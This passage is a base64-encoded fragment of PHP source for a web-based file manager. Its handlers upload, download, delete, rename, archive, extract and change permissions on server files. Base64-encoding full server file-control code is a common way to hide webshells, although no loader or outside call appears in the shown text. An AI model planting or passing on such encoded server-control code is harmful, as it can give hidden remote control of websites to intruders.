T0gJycgJiYgJG5ldyAhPSAnJykgew0KICAgICAgICBpZiAoZm1fcmVuYW1lKCRwYXRoIC4gJy8nIC4gJG9sZCwgJHBhdGggLiAnLycgLiAkbmV3KSkgew0KICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnUmVuYW1lZCBmcm9tJykuJyA8Yj4lczwvYj4gJy4gbG5nKCd0bycpLicgPGI+JXM8L2I+JywgZm1fZW5jKCRvbGQpLCBmbV9lbmMoJG5ldykpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0Vycm9yIHdoaWxlIHJlbmFtaW5nIGZyb20nKS4nIDxiPiVzPC9iPiAnLiBsbmcoJ3RvJykuJyA8Yj4lczwvYj4nLCBmbV9lbmMoJG9sZCksIGZtX2VuYygkbmV3KSksICdlcnJvcicpOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ludmFsaWQgY2hhcmFjdGVycyBpbiBmaWxlIG5hbWUnKSwgJ2Vycm9yJyk7DQogICAgfQ0KICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCn0NCg0KLy8gRG93bmxvYWQNCmlmIChpc3NldCgkX0dFVFsnZGwnXSwgJF9QT1NUWyd0b2tlbiddKSkgew0KICAgIGlmKCF2ZXJpZnlUb2tlbigkX1BPU1RbJ3Rva2VuJ10pKSB7DQogICAgICAgIGZtX3NldF9tc2coIkludmFsaWQgVG9rZW4uIiwgJ2Vycm9yJyk7DQogICAgfQ0KDQogICAgJGRsID0gdXJsZGVjb2RlKCRfR0VUWydkbCddKTsNCiAgICAkZGwgPSBmbV9jbGVhbl9wYXRoKCRkbCk7DQogICAgJGRsID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGRsKTsNCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCiAgICBpZiAoJGRsICE9ICcnICYmIGlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZGwpKSB7DQogICAgICAgIGZtX2Rvd25sb2FkX2ZpbGUoJHBhdGggLiAnLycgLiAkZGwsICRkbCwgMTAyNCk7DQogICAgICAgIGV4aXQ7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQogICAgfQ0KfQ0KDQovLyBVcGxvYWQNCmlmICghZW1wdHkoJF9GSUxFUykgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgaWYoaXNzZXQoJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBpZighdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkgKCdzdGF0dXMnID0+ICdlcnJvcicsJ2luZm8nID0+ICJJbnZhbGlkIFRva2VuLiIpOw0KICAgICAgICAgICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOyBleGl0KCk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSAoJ3N0YXR1cycgPT4gJ2Vycm9yJywnaW5mbycgPT4gIlRva2VuIE1pc3NpbmcuIik7DQogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3BvbnNlKTsgZXhpdCgpOw0KICAgIH0NCg0KICAgICRjaHVua0luZGV4ID0gJF9QT1NUWydkemNodW5raW5kZXgnXTsNCiAgICAkY2h1bmtUb3RhbCA9ICRfUE9TVFsnZHp0b3RhbGNodW5rY291bnQnXTsNCiAgICAkZnVsbFBhdGhJbnB1dCA9IGZtX2NsZWFuX3BhdGgoJF9SRVFVRVNUWydmdWxscGF0aCddKTsNCg0KICAgICRmID0gJF9GSUxFUzsNCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICAkZHMgPSBESVJFQ1RPUllfU0VQQVJBVE9SOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgJGVycm9ycyA9IDA7DQogICAgJHVwbG9hZHMgPSAwOw0KICAgICRhbGxvd2VkID0gKEZNX1VQTE9BRF9FWFRFTlNJT04pID8gZXhwbG9kZSgnLCcsIEZNX1VQTE9BRF9FWFRFTlNJT04pIDogZmFsc2U7DQogICAgJHJlc3BvbnNlID0gYXJyYXkgKA0KICAgICAgICAnc3RhdHVzJyA9PiAnZXJyb3InLA0KICAgICAgICAnaW5mbycgICA9PiAnT29wcyEgVHJ5IGFnYWluJw0KICAgICk7DQoNCiAgICAkZmlsZW5hbWUgPSAkZlsnZmlsZSddWyduYW1lJ107DQogICAgJHRtcF9uYW1lID0gJGZbJ2ZpbGUnXVsndG1wX25hbWUnXTsNCiAgICAkZXh0ID0gcGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19GSUxFTkFNRSkgIT0gJycgPyBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSkgOiAnJzsNCiAgICAkaXNGaWxlQWxsb3dlZCA9ICgkYWxsb3dlZCkgPyBpbl9hcnJheSgkZXh0LCAkYWxsb3dlZCkgOiB0cnVlOw0KDQogICAgaWYoIWZtX2lzdmFsaWRfZmlsZW5hbWUoJGZpbGVuYW1lKSAmJiAhZm1faXN2YWxpZF9maWxlbmFtZSgkZnVsbFBhdGhJbnB1dCkpIHsNCiAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkgKA0KICAgICAgICAgICAgJ3N0YXR1cycgICAgPT4gJ2Vycm9yJywNCiAgICAgICAgICAgICdpbmZvJyAgICAgID0+ICJJbnZhbGlkIEZpbGUgbmFtZSEiLA0KICAgICAgICApOw0KICAgICAgICBlY2hvIGpzb25fZW5jb2RlKCRyZXNwb25zZSk7IGV4aXQoKTsNCiAgICB9DQoNCiAgICAkdGFyZ2V0UGF0aCA9ICRwYXRoIC4gJGRzOw0KICAgIGlmICggaXNfd3JpdGFibGUoJHRhcmdldFBhdGgpICkgew0KICAgICAgICAkZnVsbFBhdGggPSAkcGF0aCAuICcvJyAuICRmdWxsUGF0aElucHV0Ow0KICAgICAgICAkZm9sZGVyID0gc3Vic3RyKCRmdWxsUGF0aCwgMCwgc3RycnBvcygkZnVsbFBhdGgsICIvIikpOw0KDQogICAgICAgIGlmICghaXNfZGlyKCRmb2xkZXIpKSB7DQogICAgICAgICAgICAkb2xkID0gdW1hc2soMCk7DQogICAgICAgICAgICBta2RpcigkZm9sZGVyLCAwNzc3LCB0cnVlKTsNCiAgICAgICAgICAgIHVtYXNrKCRvbGQpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKGVtcHR5KCRmWydmaWxlJ11bJ2Vycm9yJ10pICYmICFlbXB0eSgkdG1wX25hbWUpICYmICR0bXBfbmFtZSAhPSAnbm9uZScgJiYgJGlzRmlsZUFsbG93ZWQpIHsNCiAgICAgICAgICAgIGlmICgkY2h1bmtUb3RhbCl7DQogICAgICAgICAgICAgICAgJG91dCA9IEBmb3BlbigieyRmdWxsUGF0aH0ucGFydCIsICRjaHVua0luZGV4ID09IDAgPyAid2IiIDogImFiIik7DQogICAgICAgICAgICAgICAgaWYgKCRvdXQpIHsNCiAgICAgICAgICAgICAgICAgICAgJGluID0gQGZvcGVuKCR0bXBfbmFtZSwgInJiIik7DQogICAgICAgICAgICAgICAgICAgIGlmICgkaW4pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQSFBfVkVSU0lPTl9JRCA8IDgwMDA5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gd29ya2Fyb3VuZCBodHRwczovL2J1Z3MucGhwLm5ldC9idWcucGhwP2lkPTgxMTQ1DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZG8gew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKDs7KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmZiA9IGZyZWFkKCRpbiwgNDA5Nik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGJ1ZmYgPT09IGZhbHNlIHx8ICRidWZmID09PSAnJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRvdXQsICRidWZmKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gd2hpbGUgKCFmZW9mKCRpbikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJlYW1fY29weV90b19zdHJlYW0oJGluLCAkb3V0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5ICgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICA9PiAnc3VjY2VzcycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2luZm8nID0+ICJmaWxlIHVwbG9hZCBzdWNjZXNzZnVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5ICgNCiAgICAgICAgICAgICAgICAgICAgICAgICdzdGF0dXMnICAgID0+ICdlcnJvcicsDQogICAgICAgICAgICAgICAgICAgICAgICAnaW5mbycgPT4gImZhaWxlZCB0byBvcGVuIG91dHB1dCBzdHJlYW0iLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2Vycm9yRGV0YWlscycgPT4gZXJyb3JfZ2V0X2xhc3QoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBAZmNsb3NlKCRpbik7DQogICAgICAgICAgICAgICAgICAgIEBmY2xvc2UoJG91dCk7DQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHRtcF9uYW1lKTsNCg0KICAgICAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSAoDQogICAgICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICA9PiAnc3VjY2VzcycsDQogICAgICAgICAgICAgICAgICAgICAgICAnaW5mbycgPT4gImZpbGUgdXBsb2FkIHN1Y2Nlc3NmdWwiDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkgKA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3N0YXR1cycgICAgPT4gJ2Vycm9yJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdpbmZvJyA9PiAiZmFpbGVkIHRvIG9wZW4gb3V0cHV0IHN0cmVhbSINCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCRjaHVua0luZGV4ID09ICRjaHVua1RvdGFsIC0gMSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZV9leGlzdHMgKCRmdWxsUGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRleHRfMSA9ICRleHQgPyAnLicuJGV4dCA6ICcnOw0KICAgICAgICAgICAgICAgICAgICAgICAgJGZ1bGxQYXRoVGFyZ2V0ID0gJHBhdGggLiAnLycgLiBiYXNlbmFtZSgkZnVsbFBhdGhJbnB1dCwgJGV4dF8xKSAuJ18nLiBkYXRlKCd5bWRIaXMnKS4gJGV4dF8xOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJGZ1bGxQYXRoVGFyZ2V0ID0gJGZ1bGxQYXRoOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJlbmFtZSgieyRmdWxsUGF0aH0ucGFydCIsICRmdWxsUGF0aFRhcmdldCk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB9IGVsc2UgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkdG1wX25hbWUsICRmdWxsUGF0aCkpIHsNCiAgICAgICAgICAgICAgICAvLyBCZSBzdXJlIHRoYXQgdGhlIGZpbGUgaGFzIGJlZW4gdXBsb2FkZWQNCiAgICAgICAgICAgICAgICBpZiAoIGZpbGVfZXhpc3RzKCRmdWxsUGF0aCkgKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5ICgNCiAgICAgICAgICAgICAgICAgICAgICAgICdzdGF0dXMnICAgID0+ICdzdWNjZXNzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdpbmZvJyA9PiAiZmlsZSB1cGxvYWQgc3VjY2Vzc2Z1bCINCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSAoDQogICAgICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyA9PiAnZXJyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2luZm8nICAgPT4gJ0NvdWxkblwndCB1cGxvYWQgdGhlIHJlcXVlc3RlZCBmaWxlLicNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5ICgNCiAgICAgICAgICAgICAgICAgICAgJ3N0YXR1cycgICAgPT4gJ2Vycm9yJywNCiAgICAgICAgICAgICAgICAgICAgJ2luZm8nICAgICAgPT4gIkVycm9yIHdoaWxlIHVwbG9hZGluZyBmaWxlcy4gVXBsb2FkZWQgZmlsZXMgJHVwbG9hZHMiLA0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSAoDQogICAgICAgICAgICAnc3RhdHVzJyA9PiAnZXJyb3InLA0KICAgICAgICAgICAgJ2luZm8nICAgPT4gJ1RoZSBzcGVjaWZpZWQgZm9sZGVyIGZvciB1cGxvYWQgaXNuXCd0IHdyaXRlYWJsZS4nDQogICAgICAgICk7DQogICAgfQ0KICAgIC8vIFJldHVybiB0aGUgcmVzcG9uc2UNCiAgICBlY2hvIGpzb25fZW5jb2RlKCRyZXNwb25zZSk7DQogICAgZXhpdCgpOw0KfQ0KDQovLyBNYXNzIGRlbGV0aW5nDQppZiAoaXNzZXQoJF9QT1NUWydncm91cCddLCAkX1BPU1RbJ2RlbGV0ZSddLCAkX1BPU1RbJ3Rva2VuJ10pICYmICFGTV9SRUFET05MWSkgew0KDQogICAgaWYoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoIkludmFsaWQgVG9rZW4uIiksICdlcnJvcicpOw0KICAgIH0NCg0KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgJGVycm9ycyA9IDA7DQogICAgJGZpbGVzID0gJF9QT1NUWydmaWxlJ107DQogICAgaWYgKGlzX2FycmF5KCRmaWxlcykgJiYgY291bnQoJGZpbGVzKSkgew0KICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsNCiAgICAgICAgICAgIGlmICgkZiAhPSAnJykgew0KICAgICAgICAgICAgICAgICRuZXdfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGY7DQogICAgICAgICAgICAgICAgaWYgKCFmbV9yZGVsZXRlKCRuZXdfcGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVycm9ycysrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGVycm9ycyA9PSAwKSB7DQogICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnU2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlciBkZWxldGVkJykpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0Vycm9yIHdoaWxlIGRlbGV0aW5nIGl0ZW1zJyksICdlcnJvcicpOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ05vdGhpbmcgc2VsZWN0ZWQnKSwgJ2FsZXJ0Jyk7DQogICAgfQ0KDQogICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KfQ0KDQovLyBQYWNrIGZpbGVzIHppcCwgdGFyDQppZiAoaXNzZXQoJF9QT1NUWydncm91cCddLCAkX1BPU1RbJ3Rva2VuJ10pICYmIChpc3NldCgkX1BPU1RbJ3ppcCddKSB8fCBpc3NldCgkX1BPU1RbJ3RhciddKSkgJiYgIUZNX1JFQURPTkxZKSB7DQoNCiAgICBpZighdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygiSW52YWxpZCBUb2tlbi4iKSwgJ2Vycm9yJyk7DQogICAgfQ0KDQogICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgJGV4dCA9ICd6aXAnOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgLy9zZXQgcGFjayB0eXBlDQogICAgJGV4dCA9IGlzc2V0KCRfUE9TVFsndGFyJ10pID8gJ3RhcicgOiAnemlwJzsNCg0KICAgIGlmICgoJGV4dCA9PSAiemlwIiAmJiAhY2xhc3NfZXhpc3RzKCdaaXBBcmNoaXZlJykpIHx8ICgkZXh0ID09ICJ0YXIiICYmICFjbGFzc19leGlzdHMoJ1BoYXJEYXRhJykpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdPcGVyYXRpb25zIHdpdGggYXJjaGl2ZXMgYXJlIG5vdCBhdmFpbGFibGUnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQoNCiAgICAkZmlsZXMgPSAkX1BPU1RbJ2ZpbGUnXTsNCiAgICAkc2FuaXRpemVkX2ZpbGVzID0gYXJyYXkoKTsNCg0KICAgIC8vIGNsZWFuIHBhdGgNCiAgICBmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSl7DQogICAgICAgIGFycmF5X3B1c2goJHNhbml0aXplZF9maWxlcywgZm1fY2xlYW5fcGF0aCgkZmlsZSkpOw0KICAgIH0NCiAgICANCiAgICAkZmlsZXMgPSAkc2FuaXRpemVkX2ZpbGVzOw0KICAgIA0KICAgIGlmICghZW1wdHkoJGZpbGVzKSkgew0KICAgICAgICBjaGRpcigkcGF0aCk7DQoNCiAgICAgICAgaWYgKGNvdW50KCRmaWxlcykgPT0gMSkgew0KICAgICAgICAgICAgJG9uZV9maWxlID0gcmVzZXQoJGZpbGVzKTsNCiAgICAgICAgICAgICRvbmVfZmlsZSA9IGJhc2VuYW1lKCRvbmVfZmlsZSk7DQogICAgICAgICAgICAkemlwbmFtZSA9ICRvbmVfZmlsZSAuICdfJyAuIGRhdGUoJ3ltZF9IaXMnKSAuICcuJy4kZXh0Ow0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHppcG5hbWUgPSAnYXJjaGl2ZV8nIC4gZGF0ZSgneW1kX0hpcycpIC4gJy4nLiRleHQ7DQogICAgICAgIH0NCg0KICAgICAgICBpZigkZXh0ID09ICd6aXAnKSB7DQogICAgICAgICAgICAkemlwcGVyID0gbmV3IEZNX1ppcHBlcigpOw0KICAgICAgICAgICAgJHJlcyA9ICR6aXBwZXItPmNyZWF0ZSgkemlwbmFtZSwgJGZpbGVzKTsNCiAgICAgICAgfSBlbHNlaWYgKCRleHQgPT0gJ3RhcicpIHsNCiAgICAgICAgICAgICR0YXIgPSBuZXcgRk1fWmlwcGVyX1RhcigpOw0KICAgICAgICAgICAgJHJlcyA9ICR0YXItPmNyZWF0ZSgkemlwbmFtZSwgJGZpbGVzKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkcmVzKSB7DQogICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdBcmNoaXZlJykuJyA8Yj4lczwvYj4gJy5sbmcoJ0NyZWF0ZWQnKSwgZm1fZW5jKCR6aXBuYW1lKSkpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0FyY2hpdmUgbm90IGNyZWF0ZWQnKSwgJ2Vycm9yJyk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnTm90aGluZyBzZWxlY3RlZCcpLCAnYWxlcnQnKTsNCiAgICB9DQoNCiAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8vIFVucGFjayB6aXAsIHRhcg0KaWYgKGlzc2V0KCRfUE9TVFsndW56aXAnXSwgJF9QT1NUWyd0b2tlbiddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCg0KICAgIGlmKCF2ZXJpZnlUb2tlbigkX1BPU1RbJ3Rva2VuJ10pKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCJJbnZhbGlkIFRva2VuLiIpLCAnZXJyb3InKTsNCiAgICB9DQoNCiAgICAkdW56aXAgPSB1cmxkZWNvZGUoJF9QT1NUWyd1bnppcCddKTsNCiAgICAkdW56aXAgPSBmbV9jbGVhbl9wYXRoKCR1bnppcCk7DQogICAgJHVuemlwID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJHVuemlwKTsNCiAgICAkaXNWYWxpZCA9IGZhbHNlOw0KDQogICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgaWYgKEZNX1BBVEggIT0gJycpIHsNCiAgICAgICAgJHBhdGggLj0gJy8nIC4gRk1fUEFUSDsNCiAgICB9DQoNCiAgICBpZiAoJHVuemlwICE9ICcnICYmIGlzX2ZpbGUoJHBhdGggLiAnLycgLiAkdW56aXApKSB7DQogICAgICAgICR6aXBfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJHVuemlwOw0KICAgICAgICAkZXh0ID0gcGF0aGluZm8oJHppcF9wYXRoLCBQQVRISU5GT19FWFRFTlNJT04pOw0KICAgICAgICAkaXNWYWxpZCA9IHRydWU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgIH0NCg0KICAgIGlmICgoJGV4dCA9PSAiemlwIiAmJiAhY2xhc3NfZXhpc3RzKCdaaXBBcmNoaXZlJykpIHx8ICgkZXh0ID09ICJ0YXIiICYmICFjbGFzc19leGlzdHMoJ1BoYXJEYXRhJykpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdPcGVyYXRpb25zIHdpdGggYXJjaGl2ZXMgYXJlIG5vdCBhdmFpbGFibGUnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQoNCiAgICBpZiAoJGlzVmFsaWQpIHsNCiAgICAgICAgLy90byBmb2xkZXINCiAgICAgICAgJHRvZm9sZGVyID0gJyc7DQogICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ3RvZm9sZGVyJ10pKSB7DQogICAgICAgICAgICAkdG9mb2xkZXIgPSBwYXRoaW5mbygkemlwX3BhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKTsNCiAgICAgICAgICAgIGlmIChmbV9ta2RpcigkcGF0aCAuICcvJyAuICR0b2ZvbGRlciwgdHJ1ZSkpIHsNCiAgICAgICAgICAgICAgICAkcGF0aCAuPSAnLycgLiAkdG9mb2xkZXI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZigkZXh0ID09ICJ6aXAiKSB7DQogICAgICAgICAgICAkemlwcGVyID0gbmV3IEZNX1ppcHBlcigpOw0KICAgICAgICAgICAgJHJlcyA9ICR6aXBwZXItPnVuemlwKCR6aXBfcGF0aCwgJHBhdGgpOw0KICAgICAgICB9IGVsc2VpZiAoJGV4dCA9PSAidGFyIikgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkZ3ppcHBlciA9IG5ldyBQaGFyRGF0YSgkemlwX3BhdGgpOw0KICAgICAgICAgICAgICAgIGlmIChAJGd6aXBwZXItPmV4dHJhY3RUbygkcGF0aCxudWxsLCB0cnVlKSkgew0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcmVzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7DQogICAgICAgICAgICAgICAgLy9UT0RPOjogbmVlZCB0byBoYW5kbGUgdGhlIGVycm9yDQogICAgICAgICAgICAgICAgJHJlcyA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJHJlcykgew0KICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0FyY2hpdmUgdW5wYWNrZWQnKSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnQXJjaGl2ZSBub3QgdW5wYWNrZWQnKSwgJ2Vycm9yJyk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnRmlsZSBub3QgZm91bmQnKSwgJ2Vycm9yJyk7DQogICAgfQ0KICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCn0NCg0KLy8gQ2hhbmdlIFBlcm1zIChub3QgZm9yIFdpbmRvd3MpDQppZiAoaXNzZXQoJF9QT1NUWydjaG1vZCddLCAkX1BPU1RbJ3Rva2VuJ10pICYmICFGTV9SRUFET05MWSAmJiAhRk1fSVNfV0lOKSB7DQoNCiAgICBpZighdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygiSW52YWxpZCBUb2tlbi4iKSwgJ2Vycm9yJyk7DQogICAgfQ0KICAgIA0KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgJGZpbGUgPSAkX1BPU1RbJ2NobW9kJ107DQogICAgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsNCiAgICAkZmlsZSA9IHN0cl9yZXBsYWNlKCcvJywgJycsICRmaWxlKTsNCiAgICBpZiAoJGZpbGUgPT0gJycgfHwgKCFpc19maWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpICYmICFpc19kaXIoJHBhdGggLiAnLycgLiAkZmlsZSkpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICAgICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCg0KICAgICRtb2RlID0gMDsNCiAgICBpZiAoIWVtcHR5KCRfUE9TVFsndXInXSkpIHsNCiAgICAgICAgJG1vZGUgfD0gMDQwMDsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3V3J10pKSB